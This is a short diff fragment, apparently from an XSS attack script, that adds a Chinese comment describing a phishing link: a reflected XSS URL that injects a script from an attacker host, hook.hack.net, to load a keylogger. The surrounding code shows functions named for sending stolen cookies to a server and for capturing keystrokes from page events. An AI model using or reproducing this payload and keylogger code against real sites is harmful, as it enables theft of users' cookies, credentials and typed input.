@@ -27,6 +27,7 @@ function sendCookieToServer() {
 }
 
 // XSS Hook KeyLogger
+// 钓鱼网站包含超链接 http://target.vulhost.com/xss.php?id=<script src=http://hook.hack.net/xss_hook_keylogger.js></script>
 function sendKeyLoggerToServer() {
     const evt = evt || window.event;
     const key = String.fromCharCode(evt.charCode);
